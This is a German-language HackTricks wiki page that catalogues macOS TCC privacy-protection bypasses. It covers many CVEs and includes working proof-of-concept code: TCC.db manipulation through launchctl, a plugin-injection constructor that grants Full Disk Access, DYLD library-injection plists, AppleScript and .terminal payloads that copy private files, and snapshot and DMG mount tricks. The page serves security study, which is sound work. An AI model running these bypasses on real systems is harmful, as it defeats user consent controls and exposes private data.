# macOS TCC Bypasses

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}

## Nach Funktionalität

### Schreib-Bypass

Dies ist kein Bypass, es ist nur, wie TCC funktioniert: **Es schützt nicht vor dem Schreiben**. Wenn das Terminal **keinen Zugriff hat, um den Desktop eines Benutzers zu lesen, kann es trotzdem darauf schreiben**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Die **erweiterte Attribut `com.apple.macl`** wird der neuen **Datei** hinzugefügt, um der **erstellenden App** den Zugriff zum Lesen zu gewähren.

### TCC ClickJacking

Es ist möglich, ein **Fenster über die TCC-Aufforderung** zu legen, um den Benutzer dazu zu bringen, es **zu akzeptieren**, ohne es zu bemerken. Sie finden einen PoC in [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC-Anfrage durch beliebigen Namen

Angreifer können **Apps mit beliebigen Namen** (z.B. Finder, Google Chrome...) in der **`Info.plist`** erstellen und den Zugriff auf einen TCC-geschützten Ort anfordern. Der Benutzer wird denken, dass die legitime Anwendung diejenige ist, die diesen Zugriff anfordert.\
Darüber hinaus ist es möglich, die legitime App vom Dock zu entfernen und die gefälschte darauf zu setzen, sodass, wenn der Benutzer auf die gefälschte klickt (die dasselbe Symbol verwenden kann), sie die legitime aufrufen, um TCC-Berechtigungen zu verlangen und Malware auszuführen, wodurch der Benutzer glaubt, die legitime App habe den Zugriff angefordert.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Weitere Informationen und PoC in:

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### SSH Bypass

Standardmäßig hatte der Zugriff über **SSH "Vollzugriff auf die Festplatte"**. Um dies zu deaktivieren, müssen Sie es aufgelistet, aber deaktiviert haben (das Entfernen aus der Liste entfernt diese Berechtigungen nicht):

![](<../../../../../.gitbook/assets/image (1077).png>)

Hier finden Sie Beispiele dafür, wie einige **Malware in der Lage war, diesen Schutz zu umgehen**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Beachten Sie, dass Sie jetzt, um SSH aktivieren zu können, **Vollzugriff auf die Festplatte** benötigen.
{% endhint %}

### Handle-Erweiterungen - CVE-2022-26767

Das Attribut **`com.apple.macl`** wird Dateien zugewiesen, um einer **bestimmten Anwendung Berechtigungen zum Lesen zu gewähren.** Dieses Attribut wird gesetzt, wenn eine Datei über eine App **gezogen und abgelegt** wird oder wenn ein Benutzer eine Datei **doppelklickt**, um sie mit der **Standardanwendung** zu öffnen.

Daher könnte ein Benutzer eine **bösartige App registrieren**, um alle Erweiterungen zu verwalten und Launch Services aufzurufen, um **jede Datei zu öffnen** (so erhält die bösartige Datei Zugriff, um sie zu lesen).

### iCloud

Mit der Berechtigung **`com.apple.private.icloud-account-access`** ist es möglich, mit dem **`com.apple.iCloudHelper`** XPC-Dienst zu kommunizieren, der **iCloud-Token** bereitstellt.

**iMovie** und **Garageband** hatten diese Berechtigung und andere, die dies ermöglichten.

Für weitere **Informationen** über den Exploit, um **iCloud-Token** aus dieser Berechtigung zu erhalten, überprüfen Sie den Vortrag: [**#OBTS v5.0: "Was auf Ihrem Mac passiert, bleibt in Apples iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automatisierung

Eine App mit der Berechtigung **`kTCCServiceAppleEvents`** kann **andere Apps steuern**. Das bedeutet, dass sie in der Lage sein könnte, die Berechtigungen, die den anderen Apps gewährt wurden, **auszunutzen**.

Für weitere Informationen über Apple Scripts siehe:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Zum Beispiel, wenn eine App **Automatisierungsberechtigung über `iTerm`** hat, hat in diesem Beispiel **`Terminal`** Zugriff auf iTerm:

<figure><img src="../../../../../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>

#### Über iTerm

Terminal, das keinen FDA hat, kann iTerm aufrufen, das es hat, und es verwenden, um Aktionen auszuführen:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Über Finder

Oder wenn eine App über Finder Zugriff hat, könnte es ein Skript wie dieses sein:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Nach App-Verhalten

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Der Benutzerland **tccd-Daemon** verwendet die **`HOME`** **Umgebungsvariable**, um auf die TCC-Benutzerdatenbank zuzugreifen: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Laut [diesem Stack Exchange-Beitrag](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) und da der TCC-Daemon über `launchd` im aktuellen Benutzerbereich ausgeführt wird, ist es möglich, **alle Umgebungsvariablen** zu **steuern**, die ihm übergeben werden.\
Somit könnte ein **Angreifer die `$HOME`-Umgebungsvariable** in **`launchctl`** so einstellen, dass sie auf ein **kontrolliertes** **Verzeichnis** verweist, den **TCC**-Daemon **neustarten** und dann die **TCC-Datenbank direkt ändern**, um sich **alle verfügbaren TCC-Berechtigungen** zu geben, ohne jemals den Endbenutzer aufzufordern.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Hinweise

Notizen hatten Zugriff auf TCC-geschützte Standorte, aber wenn eine Notiz erstellt wird, wird diese **in einem nicht geschützten Standort** erstellt. Sie könnten also Notizen bitten, eine geschützte Datei in eine Notiz zu kopieren (also in einen nicht geschützten Standort) und dann auf die Datei zugreifen:

<figure><img src="../../../../../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translokation

Die Binärdatei `/usr/libexec/lsd` mit der Bibliothek `libsecurity_translocate` hatte die Berechtigung `com.apple.private.nullfs_allow`, die es ermöglichte, ein **nullfs**-Mount zu erstellen, und hatte die Berechtigung `com.apple.private.tcc.allow` mit **`kTCCServiceSystemPolicyAllFiles`**, um auf jede Datei zuzugreifen.

Es war möglich, das Quarantäneattribut zu "Library" hinzuzufügen, den **`com.apple.security.translocation`** XPC-Dienst aufzurufen und dann würde es "Library" auf **`$TMPDIR/AppTranslocation/d/d/Library`** abbilden, wo alle Dokumente in "Library" **zugänglich** sein konnten.

### CVE-2023-38571 - Musik & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** hat eine interessante Funktion: Wenn es läuft, wird es die Dateien, die in **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** abgelegt werden, in die "Medienbibliothek" des Benutzers **importieren**. Darüber hinaus ruft es etwas wie **`rename(a, b);`** auf, wobei `a` und `b` sind:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

Dieses **`rename(a, b);`** Verhalten ist anfällig für eine **Race Condition**, da es möglich ist, eine gefälschte **TCC.db**-Datei in den Ordner `Automatically Add to Music.localized` zu legen und dann, wenn der neue Ordner (b) erstellt wird, die Datei zu kopieren, sie zu löschen und auf **`~/Library/Application Support/com.apple.TCC`** zu verweisen.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Wenn **`SQLITE_SQLLOG_DIR="path/folder"`** bedeutet das im Grunde, dass **jede geöffnete DB in diesen Pfad kopiert wird**. In diesem CVE wurde diese Kontrolle missbraucht, um **in eine SQLite-Datenbank zu schreiben**, die von einem Prozess mit FDA die TCC-Datenbank **geöffnet** wird, und dann **`SQLITE_SQLLOG_DIR`** mit einem **Symlink im Dateinamen** zu missbrauchen, sodass, wenn diese Datenbank **geöffnet** wird, die Benutzer-**TCC.db überschrieben** wird mit der geöffneten.\
**Mehr Infos** [**im Bericht**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **und**[ **im Vortrag**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

Wenn die Umgebungsvariable **`SQLITE_AUTO_TRACE`** gesetzt ist, beginnt die Bibliothek **`libsqlite3.dylib`** mit dem **Protokollieren** aller SQL-Abfragen. Viele Anwendungen verwendeten diese Bibliothek, sodass es möglich war, alle ihre SQLite-Abfragen zu protokollieren.

Mehrere Apple-Anwendungen verwendeten diese Bibliothek, um auf TCC-geschützte Informationen zuzugreifen.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

Diese **Umgebungsvariable wird vom `Metal`-Framework verwendet**, das eine Abhängigkeit für verschiedene Programme ist, insbesondere `Music`, das FDA hat.

Setzen Sie Folgendes: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Wenn `path` ein gültiges Verzeichnis ist, wird der Fehler ausgelöst und wir können `fs_usage` verwenden, um zu sehen, was im Programm vor sich geht:

* Eine Datei wird `open()`ed, die `path/.dat.nosyncXXXX.XXXXXX` heißt (X ist zufällig)
* Eine oder mehrere `write()`s schreiben den Inhalt in die Datei (wir kontrollieren dies nicht)
* `path/.dat.nosyncXXXX.XXXXXX` wird `renamed()` zu `path/name`

Es handelt sich um einen temporären Dateischreibvorgang, gefolgt von einem **`rename(old, new)`**, **das nicht sicher ist.**

Es ist nicht sicher, weil es **die alten und neuen Pfade separat auflösen muss**, was einige Zeit in Anspruch nehmen kann und anfällig für eine Race Condition sein kann. Für weitere Informationen können Sie die `xnu`-Funktion `renameat_internal()` überprüfen.

{% hint style="danger" %}
Im Grunde genommen, wenn ein privilegierter Prozess von einem Ordner umbenennt, den Sie kontrollieren, könnten Sie einen RCE gewinnen und ihn dazu bringen, auf eine andere Datei zuzugreifen oder, wie in diesem CVE, die Datei zu öffnen, die die privilegierte App erstellt hat, und einen FD zu speichern.

Wenn das Umbenennen auf einen Ordner zugreift, den Sie kontrollieren, während Sie die Quelldatei geändert haben oder einen FD dafür haben, ändern Sie die Zieldatei (oder den Ordner), um auf ein Symlink zu zeigen, sodass Sie jederzeit schreiben können.
{% endhint %}

Das war der Angriff im CVE: Um beispielsweise die `TCC.db` des Benutzers zu überschreiben, können wir:

* `/Users/hacker/ourlink` erstellen, um auf `/Users/hacker/Library/Application Support/com.apple.TCC/` zu zeigen
* das Verzeichnis `/Users/hacker/tmp/` erstellen
* `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db` setzen
* den Fehler auslösen, indem Sie `Music` mit dieser Umgebungsvariable ausführen
* das `open()` von `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` abfangen (X ist zufällig)
* hier öffnen wir auch diese Datei zum Schreiben und halten den Dateideskriptor fest
* atomar `/Users/hacker/tmp` mit `/Users/hacker/ourlink` **in einer Schleife** wechseln
* wir tun dies, um unsere Chancen auf Erfolg zu maximieren, da das Zeitfenster für das Rennen ziemlich klein ist, aber das Verlieren des Rennens hat vernachlässigbare Nachteile
* ein wenig warten
* testen, ob wir Glück hatten
* wenn nicht, erneut von oben ausführen

Weitere Informationen unter [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Wenn Sie jetzt versuchen, die Umgebungsvariable `MTL_DUMP_PIPELINES_TO_JSON_FILE` zu verwenden, werden Apps nicht gestartet.
{% endhint %}

### Apple Remote Desktop

Als Root könnten Sie diesen Dienst aktivieren und der **ARD-Agent hätte vollen Festplattzugriff**, der dann von einem Benutzer missbraucht werden könnte, um eine neue **TCC-Benutzerdatenbank** zu kopieren.

## Durch **NFSHomeDirectory**

TCC verwendet eine Datenbank im HOME-Ordner des Benutzers, um den Zugriff auf benutzerspezifische Ressourcen unter **$HOME/Library/Application Support/com.apple.TCC/TCC.db** zu steuern.\
Wenn es dem Benutzer gelingt, TCC mit einer $HOME-Umgebungsvariable, die auf einen **anderen Ordner** zeigt, neu zu starten, könnte der Benutzer eine neue TCC-Datenbank in **/Library/Application Support/com.apple.TCC/TCC.db** erstellen und TCC dazu bringen, jede TCC-Berechtigung für jede App zu gewähren.

{% hint style="success" %}
Beachten Sie, dass Apple die Einstellung, die im Benutzerprofil im **`NFSHomeDirectory`**-Attribut für den **Wert von `$HOME`** gespeichert ist, verwendet. Wenn Sie also eine Anwendung mit Berechtigungen zur Änderung dieses Wertes (**`kTCCServiceSystemPolicySysAdminFiles`**) kompromittieren, können Sie diese Option mit einem TCC-Bypass **waffenfähig machen**.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Der **erste POC** verwendet [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) und [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/), um den **HOME**-Ordner des Benutzers zu ändern.

1. Holen Sie sich einen _csreq_-Blob für die Zielanwendung.
2. Platzieren Sie eine gefälschte _TCC.db_-Datei mit den erforderlichen Zugriffsrechten und dem _csreq_-Blob.
3. Exportieren Sie den Directory Services-Eintrag des Benutzers mit [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Ändern Sie den Directory Services-Eintrag, um das Home-Verzeichnis des Benutzers zu ändern.
5. Importieren Sie den geänderten Directory Services-Eintrag mit [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Stoppen Sie den _tccd_ des Benutzers und starten Sie den Prozess neu.

Der zweite POC verwendete **`/usr/libexec/configd`**, das `com.apple.private.tcc.allow` mit dem Wert `kTCCServiceSystemPolicySysAdminFiles` hatte.\
Es war möglich, **`configd`** mit der **`-t`**-Option auszuführen, ein Angreifer konnte ein **benutzerdefiniertes Bundle zum Laden** angeben. Daher ersetzt der Exploit die **`dsexport`**- und **`dsimport`**-Methode zur Änderung des Home-Verzeichnisses des Benutzers durch eine **`configd`-Code-Injektion**.

Für weitere Informationen siehe den [**originalen Bericht**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Durch Prozessinjektion

Es gibt verschiedene Techniken, um Code in einen Prozess zu injizieren und dessen TCC-Berechtigungen auszunutzen:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Darüber hinaus ist die häufigste Prozessinjektion, um TCC zu umgehen, über **Plugins (Bibliothek laden)**.\
Plugins sind zusätzlicher Code, der normalerweise in Form von Bibliotheken oder plist vorliegt, die von der Hauptanwendung **geladen werden** und unter ihrem Kontext ausgeführt werden. Daher hat der **benutzerdefinierte Code auch Zugriff**, wenn die Hauptanwendung Zugriff auf TCC-eingeschränkte Dateien hatte (über gewährte Berechtigungen oder Berechtigungen).

### CVE-2020-27937 - Directory Utility

Die Anwendung `/System/Library/CoreServices/Applications/Directory Utility.app` hatte die Berechtigung **`kTCCServiceSystemPolicySysAdminFiles`**, lud Plugins mit der **`.daplug`**-Erweiterung und **hatte nicht die gehärtete** Laufzeit.

Um diesen CVE waffenfähig zu machen, wird das **`NFSHomeDirectory`** **geändert** (unter Ausnutzung der vorherigen Berechtigung), um die TCC-Datenbank des Benutzers zu übernehmen und TCC zu umgehen.

Für weitere Informationen siehe den [**originalen Bericht**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Die Binärdatei **`/usr/sbin/coreaudiod`** hatte die Berechtigungen `com.apple.security.cs.disable-library-validation` und `com.apple.private.tcc.manager`. Die erste **erlaubt Code-Injektion** und die zweite gibt ihr Zugriff auf **die Verwaltung von TCC**.

Diese Binärdatei erlaubte das Laden von **drittanbieter Plugins** aus dem Ordner `/Library/Audio/Plug-Ins/HAL`. Daher war es möglich, **ein Plugin zu laden und die TCC-Berechtigungen** mit diesem PoC auszunutzen:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Für weitere Informationen siehe den [**originalen Bericht**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Device Abstraction Layer (DAL) Plug-Ins

Systemanwendungen, die den Kamerastream über Core Media I/O öffnen (Apps mit **`kTCCServiceCamera`**), laden **in diesem Prozess diese Plugins**, die sich in `/Library/CoreMediaIO/Plug-Ins/DAL` befinden (nicht SIP-beschränkt).

Es reicht aus, dort eine Bibliothek mit dem gemeinsamen **Konstruktor** zu speichern, um **Code zu injizieren**.

Mehrere Apple-Anwendungen waren anfällig dafür.

### Firefox

Die Firefox-Anwendung hatte die Berechtigungen `com.apple.security.cs.disable-library-validation` und `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Für weitere Informationen darüber, wie man dies leicht ausnutzen kann, [**prüfen Sie den ursprünglichen Bericht**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Die Binärdatei `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` hatte die Berechtigungen **`com.apple.private.tcc.allow`** und **`com.apple.security.get-task-allow`**, die es ermöglichten, Code in den Prozess einzuschleusen und die TCC-Berechtigungen zu nutzen.

### CVE-2023-26818 - Telegram

Telegram hatte die Berechtigungen **`com.apple.security.cs.allow-dyld-environment-variables`** und **`com.apple.security.cs.disable-library-validation`**, sodass es möglich war, dies auszunutzen, um **Zugriff auf seine Berechtigungen** zu erhalten, wie z.B. das Aufzeichnen mit der Kamera. Sie können [**die Payload im Bericht finden**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Beachten Sie, wie die Umgebungsvariable verwendet wird, um eine Bibliothek zu laden. Eine **benutzerdefinierte plist** wurde erstellt, um diese Bibliothek einzuschleusen, und **`launchctl`** wurde verwendet, um sie zu starten:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Durch offene Aufrufe

Es ist möglich, **`open`** sogar im Sandbox-Modus aufzurufen.

### Terminal-Skripte

Es ist recht üblich, dem Terminal **Vollzugriff auf die Festplatte (FDA)** zu gewähren, zumindest auf Computern, die von Technikern verwendet werden. Und es ist möglich, **`.terminal`**-Skripte damit aufzurufen.

**`.terminal`**-Skripte sind plist-Dateien wie diese mit dem Befehl, der im **`CommandString`**-Schlüssel ausgeführt werden soll:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Eine Anwendung könnte ein Terminal-Skript an einem Ort wie /tmp schreiben und es mit einem Befehl wie folgendem starten:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Durch das Einbinden

### CVE-2020-9771 - mount\_apfs TCC-Bypass und Privilegieneskalation

**Jeder Benutzer** (auch unprivilegierte) kann einen Time Machine-Snapshot erstellen und einbinden und **auf ALLE Dateien** dieses Snapshots zugreifen.\
Der **einzige privilegierte** Zugriff, der benötigt wird, ist, dass die verwendete Anwendung (wie `Terminal`) **Vollzugriff auf die Festplatte** (FDA) haben muss (`kTCCServiceSystemPolicyAllfiles`), was von einem Administrator gewährt werden muss.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Eine detailliertere Erklärung kann [**im ursprünglichen Bericht**](https://theevilbit.github.io/posts/cve\_2020\_9771/)** gefunden werden.**

### CVE-2021-1784 & CVE-2021-30808 - Über TCC-Datei mounten

Selbst wenn die TCC DB-Datei geschützt ist, war es möglich, eine neue TCC.db-Datei **über das Verzeichnis zu mounten**:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Check the **full exploit** in the [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

Das Tool **`/usr/sbin/asr`** ermöglichte es, die gesamte Festplatte zu kopieren und an einem anderen Ort zu mounten, wodurch die TCC-Schutzmaßnahmen umgangen wurden.

### Standortdienste

Es gibt eine dritte TCC-Datenbank in **`/var/db/locationd/clients.plist`**, um anzuzeigen, welche Clients **Zugriff auf Standortdienste** haben.\
Der Ordner **`/var/db/locationd/` war nicht vor DMG-Mounting geschützt**, sodass es möglich war, unsere eigene plist zu mounten.

## Durch Startup-Apps

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Durch grep

In mehreren Fällen speichern Dateien sensible Informationen wie E-Mails, Telefonnummern, Nachrichten... an ungeschützten Orten (was als Schwachstelle bei Apple zählt).

<figure><img src="../../../../../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetische Klicks

Das funktioniert nicht mehr, aber es [**funktionierte in der Vergangenheit**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Eine andere Möglichkeit, die [**CoreGraphics-Ereignisse**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf) verwendet:

<figure><img src="../../../../../.gitbook/assets/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Referenz

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Wege, um Ihre macOS-Datenschutzmechanismen zu umgehen**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout-Sieg gegen TCC - 20+ NEUE Wege, um Ihre MacOS-Datenschutzmechanismen zu umgehen**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
